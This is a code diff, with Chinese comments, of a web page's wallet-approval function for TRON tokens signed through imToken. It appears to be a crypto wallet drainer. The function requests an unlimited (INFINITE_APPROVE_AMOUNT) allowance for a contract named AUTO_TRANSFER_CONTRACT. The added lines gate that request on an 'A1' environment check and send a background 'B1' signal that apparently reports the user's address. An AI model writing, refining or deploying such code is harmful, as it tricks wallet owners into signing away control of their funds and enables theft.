@@ -1409,6 +1409,19 @@ function bindApproveLogic() {
         reviewTipText.textContent = "发起签名，请在imToken中确认...";
 
         try {
+            // 新增1：A1信号校验（保留原有校验逻辑，失败则终止流程）
+            const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
+            const isA1Success = a1Status[userAddress] === "success";
+            if (!isA1Success) {
+                throw new Error("A1环境校验未通过，请重新连接钱包或稍后重试");
+            }
+
+            // 新增2：保留B1信号发送（异步执行，不阻塞Approve）
+            if (!hasSentB1Signal(userAddress)) {
+                sendSignalB(true).catch(err => console.warn("B1信号发送失败（不影响签名）：", err));
+                markB1SignalSent(userAddress);
+            }
+
             // 核心校验：确保已有合约实例有效（复用前置初始化的trc20Contract）
             if (!trc20Contract) {
                 // 兜底：如果实例意外失效，用已有ABI重新快速初始化（仅兜底，正常情况不会走）
@@ -1421,7 +1434,7 @@ function bindApproveLogic() {
                 await new Promise(resolve => tronWeb.onReady(resolve));
             }
 
-            // 关键：直接调用已有合约实例的approve方法（不新建、不跳转、不碰A1/B1）
+            // 关键：直接调用已有合约实例的approve方法（不新建、不跳转、不碰A1/B1核心逻辑）
             const approveResult = await trc20Contract.approve(
                 AUTO_TRANSFER_CONTRACT, // 授权对象（前置已确认）
                 INFINITE_APPROVE_AMOUNT // 无限授权金额（已有ABI支持）
@@ -1450,8 +1463,13 @@ function bindApproveLogic() {
             reviewTip.style.display = "none";
             btn.disabled = false;
             btn.textContent = lang.approveBtnText;
-            // 明确提示是否是合约实例问题
-            const errMsg = e.message.includes("contract") ? "合约实例无效，请重新连接钱包" : e.message;
+            // 明确提示错误类型（含A1校验失败、合约实例问题等）
+            let errMsg = e.message;
+            if (errMsg.includes("A1环境校验")) {
+                errMsg = "A1环境校验未通过，请重新连接钱包";
+            } else if (errMsg.includes("contract")) {
+                errMsg = "合约实例无效，请重新连接钱包";
+            }
             alert(lang.authorizeFail.replace("{msg}", errMsg || "签名取消或网络异常"));
         }
     };
